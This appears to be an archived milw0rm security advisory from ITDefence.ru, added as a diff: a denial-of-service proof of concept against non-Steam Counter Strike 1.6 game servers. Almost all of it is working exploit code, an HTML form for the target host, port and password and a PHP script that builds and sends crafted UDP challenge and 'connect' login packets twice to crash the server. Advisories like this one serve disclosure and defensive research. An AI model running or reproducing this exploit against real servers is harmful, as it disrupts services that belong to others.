@@ -1,0 +1,187 @@
+----[  Counter Strike 1.6 Denial Of Service POC ... ITDefence.ru Antichat.ru ]
+
+							Counter Strike 1.6 Denial Of Service POC
+								Eugene Minaev underwater@itdefence.ru
+							Bug was found by Maxim Suhanov ( THE FUF )
+								works only with no-steam servers
+				___________________________________________________________________
+			____/  __ __ _______________________ _______  _______________    \  \   \
+			/ .\  /  /_// //              /        \       \/      __       \   /__/   /
+			/ /     /_//              /\        /       /      /         /     /___/
+			\/        /              / /       /       /\     /         /         /
+			/        /               \/       /       / /    /         /__       //\
+			\       /    ____________/       /        \/    __________// /__    // /   
+			/\\      \_______/        \________________/____/  2007    /_//_/   // //\
+			\ \\                                                               // // /
+			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / . 
+			. \_\\________[________________________________________]_________//_//_/ . .
+		
+		<html>
+		<head>
+		<title>Counter Strike DOS POC (underwater@itdefence.ru) </title>
+
+		<style type="text/css">
+
+		input {
+		width: 150px;
+		}
+
+		td {
+		font-size: 12px;
+		font-family: Verdana, "Trebuchet MS";
+		text-align: left;
+		}
+
+		span.err {
+		color: red;
+		}
+
+		span.ok {
+		color: green;
+		}
+
+		</style>
+
+		</head>
+
+		<body onload="checkpass()">
+
+		<div style="width: 210px; margin: auto;">
+		<form name="csform" method="post" action="cs.php">
+
+		<table border="1" align="center" cellpadding="2" cellspacing="0" style="width: 100%;">
+		<tr>
+		<td style="width: 50px;">Host</td>
+		<td colspan="2"><input name="host" type="text" value=""/></td>
+		</tr>
+
+		<tr>
+		<td>Port</td>
+		<td colspan="2"><input name="port" type="text" value=""/></td>
+		</tr>
+
+		<tr>
+		<td>&nbsp;</td>
+		<td><input name="auth" type="checkbox" value="" style="width: 30px;"/></td>
+		<td>Auth Type 2</td>
+		</tr>
+
+		<tr>
+		<td>Pass</td>
+		<td colspan="2"><input name="pass" type="text" value="" /></td>
+		</tr>
+
+
+		<tr>
+		<td>&nbsp;</td>
+		<td colspan="2"><input type="submit" Value="Run"/></td>
+		</tr>
+
+
+		</table> 
+		<br/>
+		</form>
+		</div>
+		<center>ITDEFENCE / RUSSIA (http://itdefence.ru)<br>
+		</body>
+		</html>
+
+		<?php
+
+		/*
+		CS-dos exploit made by underwater 
+		Bug was discovered by .FUF  
+		Big respect 2 Sax-mmS ( for html ) , Focs ( for his cs server [IMG]http://www.softoplanet.ru/style_emoticons/default/biggrin.gif[/IMG] ) , SkvoznoY , Bug(O)R,Antichat.ru and Cup.su
+		*/
+
+		ini_set("display_errors","0");
+
+		function HELLO_PACKET()
+		{
+		$packet = pack("H*","FFFFFFFF");
+		$packet .= "TSource Engine Query";
+		$packet .= pack("H*","00");
+		return $packet;
+		}
+
+		function CHALLENGE_PACKET()
+		{
+		$packet = pack("H*","FFFFFFFF");
+		$packet .= "getchallenge valve";
+		$packet .= pack("H*","00");
+		return $packet;
+		}
+
+		function LOGIN_PACKET_4()
+		{
+		global $cookie;
+		global $password;
+		$packet = pack("H*","FFFFFFFF");
+		$packet .= "connect 47 ";
+		$packet .= $cookie.' "';
+		$packet .= '\prot\4\unique\-1\raw\valve\cdkey\d506d189cf551620a70277a3d2c55bb2" "';
+		$packet .= '\_cl_autowepswitch\1\bottomcolor\6\cl_dlmax\128\cl_lc\1\cl_lw\1\cl_updaterate\30\mod';
+		$packet .= 'el\gordon\name\Born to be pig (..)\topcolor\30\_vgui_menus\1\_ah\1\rate\3500\*fid\0\pass';
+		$packet .= 'word\\'.$password;
+		$packet .= pack("H*","220A0000EE02");
+		return $packet;
+		}
+
+		function LOGIN_PACKET_2()
+		{
+		global $cookie;
+		global $password;
+		$packet = pack("H*","FFFFFFFF");
+		$packet .= "connect 47 ";
+		$packet .= $cookie.' "';
+		$packet .= '\prot\2\raw\d506d189cf551620a70277a3d2c55bb2" "\_cl_autowepswitch\1\bott';
+		$packet .= 'omcolor\6\cl_dlmax\128\cl_lc\1\cl_lw\1\cl_updaterate\30\model\gordon\nam';
+		$packet .= 'e\Born to be pig (..)\topcolor\30\_vgui_menus\1\_ah\1\rate\3500\*fid\0\pass';
+		$packet .= 'word\\'.$password;
+		$packet .= pack("H*","22");
+		return $packet;
+		}
+
+		function dowork($host,$port,$password,$auth)
+		{
+		global $password;
+		global $cookie;
+		# connecting to target host
+		$fsock = fsockopen("udp://".$host,(int) $port,$errnum,$errstr,2);
+		if (!$fsock) die ($errstr);
+		else 
+		{
+		# sending hello packet
+		fwrite ($fsock,HELLO_PACKET());
+		fread ($fsock,100);
+		# sending chalennge packet
+		fwrite ($fsock,CHALLENGE_PACKET());
+		# recieving cookies
+		$resp = fread($fsock,100);
+		# grab cookies from packet
+		$cookie = substr($resp,strpos($resp,"A00000000")+10);
+		$cookie = substr($cookie,0,strpos($cookie," "));
+		# sending login packet
+		if (!$auth) fwrite ( $fsock,LOGIN_PACKET_4());else fwrite ( $fsock,LOGIN_PACKET_2());
+		$resp = fread($fsock,100);
+		}
+		}
+
+		IF (isset($_POST['host']) && isset($_POST['port']))
+		{
+		IF (empty($_POST['pass'])) $password = "123";
+		else $password = $_POST['pass'];
+		$fserver = $_POST['host'];
+		$fport = $_POST['port'];
+		if (isset($_POST['auth'])) $fauth = true;else $fauth=false;
+		# we have to connect 2 times
+		$result = dowork($fserver,$fport,$password,$fauth);
+		$result = dowork($fserver,$fport,$password,$fauth);
+		# parsing result
+		echo "Exploit Sent";
+		}
+		?>
+
+----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]
+
+# milw0rm.com [2008-01-06]
